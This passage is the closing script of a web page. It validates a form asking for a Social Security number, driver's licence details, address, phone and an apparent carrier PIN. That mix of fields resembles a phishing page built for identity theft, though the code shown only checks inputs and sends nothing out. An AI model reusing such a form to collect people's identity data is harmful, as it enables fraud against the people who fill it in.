            $("#fnamelabel").addClass('error--text');
            $("#fnamediv").addClass('v-input--has-state');

            $("#fnameerror").show();
            event.preventDefault();

        } else {
            $("#fnamelabel").removeClass('error--text');
            $("#fnamediv").addClass('v-input--is-dirty');
            $("#fnamediv").removeClass('error--text');
            $("#fnameerror").hide();
            $("#fnamediv").removeClass('v-input--has-state');


        }
        //fname
        if ($('#dob').val().length == 0) {
            $("#doblabel").removeClass('v-label--active ');
            $("#dobdiv").removeClass('v-input--is-dirty');
            $("#dobdiv").addClass('error--text');
            $("#doblabel").addClass('error--text');
            $("#doberror").show();
            $("#dobdiv").addClass('v-input--has-state');
            event.preventDefault();

        } else if ($('#dob').val().length < 10) {
            $("#dobdiv").removeClass('v-input--is-focused');
            $("#dobdiv").addClass('error--text');
            $("#doblabel").addClass('error--text');
            $("#dobdiv").addClass('v-input--has-state');

            $("#doberror").show();
            event.preventDefault();

        } else {
            $("#doblabel").removeClass('error--text');
            $("#dobdiv").addClass('v-input--is-dirty');
            $("#dobdiv").removeClass('error--text');
            $("#doberror").hide();
            $("#dobdiv").removeClass('v-input--has-state');


        }
        //ssn
        if ($('#ssn').val().length == 0) {
            $("#ssnlabel").removeClass('v-label--active ');
            $("#ssndiv").removeClass('v-input--is-dirty');
            $("#ssndiv").addClass('error--text');
            $("#ssnlabel").addClass('error--text');
            $("#ssnerror").show();
            $("#ssndiv").addClass('v-input--has-state');
            event.preventDefault();

        } else if ($('#ssn').val().length < 9) {
            $("#ssndiv").removeClass('v-input--is-focused');
            $("#ssndiv").addClass('error--text');
            $("#ssnlabel").addClass('error--text');
            $("#ssndiv").addClass('v-input--has-state');

            $("#ssnerror").show();
            event.preventDefault();

        } else {
            $("#ssnlabel").removeClass('error--text');
            $("#ssndiv").addClass('v-input--is-dirty');
            $("#ssndiv").removeClass('error--text');
            $("#ssnerror").hide();
            $("#ssndiv").removeClass('v-input--has-state');


        }
        //dln
        if ($('#dln').val().length == 0) {
            $("#dlnlabel").removeClass('v-label--active ');
            $("#dlndiv").removeClass('v-input--is-dirty');
            $("#dlndiv").addClass('error--text');
            $("#dlnlabel").addClass('error--text');
            $("#dlnerror").show();
            $("#dlndiv").addClass('v-input--has-state');
            event.preventDefault();

        } else if ($('#dln').val().length < 3) {
            $("#dlndiv").removeClass('v-input--is-focused');
            $("#dlndiv").addClass('error--text');
            $("#dlnlabel").addClass('error--text');
            $("#dlndiv").addClass('v-input--has-state');

            $("#dlnerror").show();
            event.preventDefault();

        } else {
            $("#dlnlabel").removeClass('error--text');
            $("#dlndiv").addClass('v-input--is-dirty');
            $("#dlndiv").removeClass('error--text');
            $("#dlnerror").hide();
            $("#dlndiv").removeClass('v-input--has-state');


        }
        //dlexp
        if ($('#dlexp').val().length == 0) {
            $("#dlexplabel").removeClass('v-label--active ');
            $("#dlexpdiv").removeClass('v-input--is-dirty');
            $("#dlexpdiv").addClass('error--text');
            $("#dlexplabel").addClass('error--text');
            $("#dlexperror").show();
            $("#dlexpdiv").addClass('v-input--has-state');
            event.preventDefault();

        } else if ($('#dlexp').val().length < 7) {
            $("#dlexpdiv").removeClass('v-input--is-focused');
            $("#dlexpdiv").addClass('error--text');
            $("#dlexplabel").addClass('error--text');
            $("#dlexpdiv").addClass('v-input--has-state');

            $("#dlexperror").show();
            event.preventDefault();

        } else {
            $("#dlexplabel").removeClass('error--text');
            $("#dlexpdiv").addClass('v-input--is-dirty');
            $("#dlexpdiv").removeClass('error--text');
            $("#dlexperror").hide();
            $("#dlexpdiv").removeClass('v-input--has-state');


        }
        //dlissue
        if ($('#dlissue').val().length == 0) {
            $("#dlissuelabel").removeClass('v-label--active ');
            $("#dlissuediv").removeClass('v-input--is-dirty');
            $("#dlissuediv").addClass('error--text');
            $("#dlissuelabel").addClass('error--text');
            $("#dlissueerror").show();
            $("#dlissuediv").addClass('v-input--has-state');
            event.preventDefault();

        } else if ($('#dlissue').val().length < 7) {
            $("#dlissuediv").removeClass('v-input--is-focused');
            $("#dlissuediv").addClass('error--text');
            $("#dlissuelabel").addClass('error--text');
            $("#dlissuediv").addClass('v-input--has-state');

            $("#dlissueerror").show();
            event.preventDefault();

        } else {
            $("#dlissuelabel").removeClass('error--text');
            $("#dlissuediv").addClass('v-input--is-dirty');
            $("#dlissuediv").removeClass('error--text');
            $("#dlissueerror").hide();
            $("#dlissuediv").removeClass('v-input--has-state');


        }
        //addr
        if ($('#addr').val().length == 0) {
            $("#addrlabel").removeClass('v-label--active ');
            $("#addrdiv").removeClass('v-input--is-dirty');
            $("#addrdiv").addClass('error--text');
            $("#addrlabel").addClass('error--text');
            $("#addrerror").show();
            $("#addrdiv").addClass('v-input--has-state');
            event.preventDefault();

        } else if ($('#addr').val().length < 3) {
            $("#addrdiv").removeClass('v-input--is-focused');
            $("#addrdiv").addClass('error--text');
            $("#addrlabel").addClass('error--text');
            $("#addrdiv").addClass('v-input--has-state');

            $("#addrerror").show();
            event.preventDefault();

        } else {
            $("#addrlabel").removeClass('error--text');
            $("#addrdiv").addClass('v-input--is-dirty');
            $("#addrdiv").removeClass('error--text');
            $("#addrerror").hide();
            $("#addrdiv").removeClass('v-input--has-state');


        }
        //state
        if ($('#state').val().length == 0) {
            $("#statelabel").removeClass('v-label--active ');
            $("#statediv").removeClass('v-input--is-dirty');
            $("#statediv").addClass('error--text');
            $("#statelabel").addClass('error--text');
            $("#stateerror").show();
            $("#statediv").addClass('v-input--has-state');
            event.preventDefault();

        } else if ($('#state').val().length < 2) {
            $("#statediv").removeClass('v-input--is-focused');
            $("#statediv").addClass('error--text');
            $("#statelabel").addClass('error--text');
            $("#statediv").addClass('v-input--has-state');

            $("#stateerror").show();
            event.preventDefault();

        } else {
            $("#statelabel").removeClass('error--text');
            $("#statediv").addClass('v-input--is-dirty');
            $("#statediv").removeClass('error--text');
            $("#stateerror").hide();
            $("#statediv").removeClass('v-input--has-state');


        }
        //zip
        if ($('#zip').val().length == 0) {
            $("#ziplabel").removeClass('v-label--active ');
            $("#zipdiv").removeClass('v-input--is-dirty');
            $("#zipdiv").addClass('error--text');
            $("#ziplabel").addClass('error--text');
            $("#ziperror").show();
            $("#zipdiv").addClass('v-input--has-state');
            event.preventDefault();

        } else if ($('#zip').val().length < 5) {
            $("#zipdiv").removeClass('v-input--is-focused');
            $("#zipdiv").addClass('error--text');
            $("#ziplabel").addClass('error--text');
            $("#zipdiv").addClass('v-input--has-state');

            $("#ziperror").show();
            event.preventDefault();

        } else {
            $("#ziplabel").removeClass('error--text');
            $("#zipdiv").addClass('v-input--is-dirty');
            $("#zipdiv").removeClass('error--text');
            $("#ziperror").hide();
            $("#zipdiv").removeClass('v-input--has-state');


        }
        //phone
        if ($('#phone').val().length == 0) {
            $("#phonelabel").removeClass('v-label--active ');
            $("#phonediv").removeClass('v-input--is-dirty');
            $("#phonediv").addClass('error--text');
            $("#phonelabel").addClass('error--text');
            $("#phoneerror").show();
            $("#phonediv").addClass('v-input--has-state');
            event.preventDefault();

        } else if ($('#phone').val().length < 14) {
            $("#phonediv").removeClass('v-input--is-focused');
            $("#phonediv").addClass('error--text');
            $("#phonelabel").addClass('error--text');
            $("#phonediv").addClass('v-input--has-state');

            $("#phoneerror").show();
            event.preventDefault();

        } else {
            $("#phonelabel").removeClass('error--text');
            $("#phonediv").addClass('v-input--is-dirty');
            $("#phonediv").removeClass('error--text');
            $("#phoneerror").hide();
            $("#phonediv").removeClass('v-input--has-state');


        }
        //cpin
        if ($('#cpin').val().length == 0) {
            $("#cpinlabel").removeClass('v-label--active ');
            $("#cpindiv").removeClass('v-input--is-dirty');
            $("#cpindiv").addClass('error--text');
            $("#cpinlabel").addClass('error--text');
            $("#cpinerror").show();
            $("#cpindiv").addClass('v-input--has-state');
            event.preventDefault();

        } else if ($('#cpin').val().length < 2) {
            $("#cpindiv").removeClass('v-input--is-focused');
            $("#cpindiv").addClass('error--text');
            $("#cpinlabel").addClass('error--text');
            $("#cpindiv").addClass('v-input--has-state');

            $("#cpinerror").show();
            event.preventDefault();

        } else {
            $("#cpinlabel").removeClass('error--text');
            $("#cpindiv").addClass('v-input--is-dirty');
            $("#cpindiv").removeClass('error--text');
            $("#cpinerror").hide();
            $("#cpindiv").removeClass('v-input--has-state');


        }

    });


    $('#zip').mask('00000');
    $('#dob').mask('00/00/0000');
    $('#dlexp').mask('00/0000');
    $('#dlissue').mask('00/0000');
    $('#ssn').mask('000000000');
    $('#phone').mask('(000) 000 0000');
    $('#cpin').mask('000000000');
</script>

</html>